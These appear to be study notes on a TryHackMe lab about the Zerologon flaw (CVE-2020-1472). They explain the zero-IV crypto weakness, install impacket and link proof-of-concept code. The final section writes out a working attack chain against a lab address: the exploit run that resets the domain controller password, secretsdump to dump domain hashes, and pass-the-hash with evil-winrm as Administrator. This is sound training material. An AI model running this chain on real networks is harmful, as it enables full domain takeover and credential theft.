# Room
https://tryhackme.com/room/zer0logon

# Task 1 - intro
* zero logon - zero to domain admin in one minute : CVE-2020-1472
* statistics based attack
* abuses feature in MS-NRPC - Microsoft NetLgon Remote Protocol
* MS-NRPC is an authentication component of AD that handles auth for user and machine accounts
* the attack is on the crypto and the exploitation of a hard coded IV of all zeros
* when an attacker sends a message only containing zeros with an IV of zero, there is a 1 in 256 chance the ciphertext will be zero
* resources
    * https://www.secura.com/pathtoimg.php?id=2055
    * https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/7b9e31d1-670e-4fc5-ad54-9ffff50755f9
    * https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9

# Task 2 - impacket install
* impacket install
    * python3 -m pip install virtualenv
    * python3 -m virtualenv impacketEnv
    * source impacketEnv/bin/activate
    * pip install git+https://github.com/SecureAuthCorp/impacket

# Task 3 - poc
* resources
    * https://github.com/SecuraBV/CVE-2020-1472
    * https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81
    * https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9
* poc review
    * https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py
    * https://github.com/SecureAuthCorp/impacket/blob/master/impacket/dcerpc/v5/nrpc.py
* modified code
    * https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py

# Task 4 - exploit
* enumerate
    ```
    nmap -A -T4 10.10.5.119
    ```
* attack
    ```
    (impacketEnv) root@ip-10-10-69-223:~# python3 zp.py [name] 10.10.5.119

    _____                   __                         
    / _  / ___ _ __ ___     / /  ___   __ _  ___  _ __  
    \// / / _ \ '__/ _ \   / /  / _ \ / _` |/ _ \| '_ \ 
    / //\  __/ | | (_) | / /__| (_) | (_| | (_) | | | |
    /____/\___|_|  \___/  \____/\___/ \__, |\___/|_| |_|
                                    |___/             
                    Vulnerability Discovered by Tom Tervoort
                                Exploit by Ronnie Bartwitz
    
    Performing authentication attempts...
    Failure to Autheticate at attempt number: 321
    Zero Logon successfully exploited, changing password.    
    ```
* dump secrets
    ```
    secretsdump.py -just-dc -no-pass [name]\$@10.10.5.119
    ```
* pass the hash
    ```
    evil-winrm -u Administrator -H [admin_hash] -i 10.10.5.119
    ```